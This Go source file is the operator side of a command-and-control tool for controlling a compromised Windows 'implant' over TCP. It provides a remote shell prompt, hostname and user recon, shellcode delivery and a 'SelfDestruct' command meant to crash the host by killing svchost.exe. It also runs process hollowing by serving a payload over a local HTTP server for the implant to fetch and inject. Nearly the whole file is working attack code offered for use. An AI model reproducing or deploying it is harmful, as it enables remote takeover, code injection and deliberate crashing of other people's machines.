package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
)

// Server-Sides needs to handle errors better
func shell(conn *net.Conn) {
	reader := bufio.NewReader(os.Stdin)
L: //Labeled the for loop with L if i need to break it from switch. Faster than if statements. Works.
	for {
		fmt.Print("PS > ")
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Error reading input:", err)
			continue
		}
		switch command {
		case "\n":
			continue
		case "cls\n":
			continue
		case "bg\n":
			break L
		case "exit\n":
			break L
		default:
			(*conn).Write([]byte(command))
			request := make([]byte, 9000)
			read_len, err := (*conn).Read(request)
			if read_len == 0 {
				fmt.Println("Read Length is 0")
				os.Exit(0)
			}
			if err != nil {
				os.Exit(0)
			}
			reply := string(request[:read_len])
			fmt.Println(reply)
		}
	}
}

func hostinfo(conn *net.Conn) (string, string) {
	fmt.Println()
	(*conn).Write([]byte("hostname\n"))
	request := make([]byte, 9000)
	read_len, err := (*conn).Read(request)
	if read_len == 0 {
		fmt.Println("[-]Read Length is 0")
		return "ERROR", "ERROR"
	}
	if err != nil {
		fmt.Println("[-]Error with reading from buffer")
		return "ERROR", "ERROR"
	}
	hostname := string(request[:read_len])
	(*conn).Write([]byte("whoami\n"))
	read_len, err = (*conn).Read(request)
	if read_len == 0 {
		fmt.Println("[-]Read Length is 0")
		return "ERROR", "ERROR"
	}
	if err != nil {
		fmt.Println("[-]Error with reading from buffer")
		return "ERROR", "ERROR"
	}
	whoami := string(request[:read_len])
	return hostname, whoami
}

func bsod(conn *net.Conn) bool { //Works but implant should be running as admin
	fmt.Println("[!]Initiating BSOD by killing svchost.exe")
	(*conn).Write([]byte("SelfDestruct\n"))
	fmt.Println("[+]Kill Signal Sent")
	reply := make([]byte, 9000)
	(*conn).SetReadDeadline(time.Now().Add(15 * time.Second))

	read_len, err := (*conn).Read(reply)
	if read_len == 0 {
		(*conn).Close()
		return true
	}
	if err != nil {
		(*conn).Close()
		return true
	}
	strReply := string(reply[:read_len])
	if strReply == "NoTime2Die\n" {
		fmt.Println(strReply)
		return false
	}
	return true
}

// func playAudio(conn *net.Conn, audioFile string) {
// 	fmt.Println("Playing audio on the remote host :)")
// 	contents, err := os.ReadFile("Audio/" + audioFile)
// 	if err != nil {
// 		fmt.Println("Couldn't read the file !")
// 		return
// 	}
// 	(*conn).Write([]byte("play\n"))
// 	(*conn).Write(contents)
// }

func load(conn *net.Conn, fileWShellcode string) {
	fmt.Println("Good luck")
	file, err := os.ReadFile("Shellcode/" + fileWShellcode)
	if err != nil {
		fmt.Println("Couldn't read the file !")
		return
	}
	(*conn).Write([]byte("barCode\n"))
	(*conn).Write(file)
}

func ls(conn *net.Conn) {
	(*conn).Write([]byte("ls\n"))
	request := make([]byte, 99999)
	read_len, err := (*conn).Read(request)
	if read_len == 0 {
		(*conn).Close()
		fmt.Println("Error")
		return
	}
	if err != nil {
		(*conn).Close()
		fmt.Println("Error")
		return
	}
	reply := string(request[:read_len])
	fmt.Println(reply)
}

func cd(conn *net.Conn, dir2go string) { //Test this since I think cd .. is not working
	(*conn).Write([]byte("cd\n"))
	(*conn).Write([]byte("cd " + dir2go))
}

func pwd(conn *net.Conn) {
	(*conn).Write([]byte("pwd\n"))
	request := make([]byte, 99999)
	read_len, err := (*conn).Read(request)
	if read_len == 0 {
		(*conn).Close()
		fmt.Println("Error")
		return
	}
	if err != nil {
		(*conn).Close()
		fmt.Println("Error")
		return
	}
	reply := string(request[:read_len])
	fmt.Println()
	fmt.Println(reply)
	fmt.Println()
}

func hollow(conn *net.Conn, filePathLocal string, filePathRemote string) {
	file, err := os.Stat(filePathLocal)
	if err != nil {
		fmt.Println("[-]Couldn't read the file on the local machine !")
		return
	}
	//now we enter the hollowing function
	buffer := make([]byte, 1000000) //Fix buffer size later
	fmt.Println("[*]Sending Signal ...")
	(*conn).Write([]byte("hollow\n"))
	read_len, err := (*conn).Read(buffer)
	if err != nil {
		fmt.Println("[-]Error Reading From Buffer")
		return
	}
	if read_len <= 1 {
		fmt.Println("[-]Error with length of Buffer")
		return
	}
	bufferSnapped := buffer[:read_len]
	bufferStr := string(bufferSnapped)
	if bufferStr != "OK\n" {
		fmt.Println("[-]Couldn't initiate Hollowing")
	}
	fmt.Println("[+]Signal was recieved and acknowledged")
	//Write the remote path
	fmt.Println("[*]Writing the Remote Path ...")
	(*conn).Write([]byte(filePathRemote))
	read_len, err = (*conn).Read(buffer)
	if err != nil {
		fmt.Println("[-]Error Reading From Buffer")
		return
	}
	if read_len <= 1 {
		fmt.Println("[-]Error with length of buffer")
		return
	}
	bufferSnapped = buffer[:read_len]
	bufferStr = string(bufferSnapped)
	if bufferStr != "OK\n" {
		fmt.Println("[-]The Remote File Does Not Exist")
		return
	}
	fmt.Println("[+]The Remote File Exists !")
	//Send the entire URL instead
	fileName := file.Name()
	//Will pass a custom URL input by the user instead later
	localAddress := (*conn).LocalAddr().String()
	localIP := strings.Split(localAddress, ":")[0]
	//Since we hard coded it to be 8080 the port we listen on we do the folowing
	downloadURL := "http://" + localIP + ":8080/" + fileName
	(*conn).Write([]byte(downloadURL))
	read_len, err = (*conn).Read(buffer)
	if err != nil {
		fmt.Println("[-]Error Reading From Buffer")
		return
	}
	if read_len <= 1 {
		fmt.Println("[-]Error with length of buffer")
		return
	}
	bufferSnapped = buffer[:read_len]
	bufferStr = string(bufferSnapped)
	if bufferStr != "OK\n" {
		fmt.Println("[-]URL did not send")
		return
	}
	//Improve this just by sending the whole download URL instead and doing this shit server side
	fmt.Println("[+]Download URL sent successfully !")
	fmt.Println("[*]Started python HTTP Server in Bushido dir")
	fmt.Println("[!]Manually terminate the HTTP server after the client recieves the file !")
	fmt.Println("[*]Waiting for hollowing to finish ...")
	cmd := exec.Command("./scripts/pythonServer.sh")
	cmd.Run()
	read_len, err = (*conn).Read(buffer)
	if err != nil {
		fmt.Println("[-]Error Reading From Buffer")
		return
	}
	if read_len <= 1 {
		fmt.Println("[-]Error with length of buffer")
		return
	}
	//(*conn).SetReadDeadline(10 * time.Second)
	bufferSnapped = buffer[:read_len]
	bufferStr = string(bufferSnapped)
	if bufferStr != "OK\n" {
		fmt.Println("[-]Something went wrong")
		return
	}
	fmt.Println("[+]Successful Proccess Hollowing !")
	fmt.Println()
}
